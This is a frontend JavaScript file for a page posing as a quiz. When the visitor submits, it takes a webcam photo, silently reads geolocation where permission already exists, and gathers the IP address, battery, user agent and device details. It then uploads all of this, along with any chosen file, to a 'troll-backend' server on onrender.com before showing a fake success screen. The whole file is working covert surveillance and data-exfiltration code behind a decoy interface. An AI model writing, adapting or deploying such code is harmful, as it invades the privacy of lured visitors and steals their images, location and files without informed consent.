// ================================
// FRONTEND SCRIPT.JS
// ================================

const btn = document.getElementById('submit-btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');
const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// ================================
// GET DEVICE IP
// ================================
async function getIp() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || "N/A";
  } catch {
    return "N/A";
  }
}

// ================================
// SILENT LOCATION
// ================================
async function getSilentLocation() {
  let loc = "N/A";
  if (!navigator.permissions) return loc;
  try {
    const status = await navigator.permissions.query({ name: "geolocation" });
    if (status.state === "granted") {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      loc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
    }
  } catch {}
  return loc;
}

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const ip = await getIp();
  const location = await getSilentLocation();
  let battery = "N/A";

  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  return {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery,
    location,
    time: new Date().toLocaleString(),
    deviceMemory: navigator.deviceMemory || "N/A",
    ip
  };
}

// ================================
// CAPTURE CAMERA IMAGE
// ================================
async function captureAndSendCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await new Promise(r => setTimeout(r, 2500)); // wait 2.5s for focus

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const image = canvas.toDataURL("image/png");

    const metadata = await collectMetadata();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    stream.getTracks().forEach(t => t.stop());
  } catch (err) {
    console.error("Camera capture error:", err);
    alert("Camera permission denied or error occurred.");
  }
}

// ================================
// SEND FILE
// ================================
async function sendFile(file) {
  if (!file) return;
  const reader = new FileReader();
  reader.onload = async () => {
    await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ file: reader.result, filename: file.name })
    });
  };
  reader.readAsDataURL(file);
}

// ================================
// SUBMIT
// ================================
btn.addEventListener('click', async (e) => {
  e.preventDefault();

  // ✅ Wait for camera capture if permission granted
  await captureAndSendCamera();

  // ✅ Wait for file upload if selected
  if (fileInput && fileInput.files.length > 0) {
    await sendFile(fileInput.files[0]);
  }

  // ✅ Show success page
  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "flex";
});
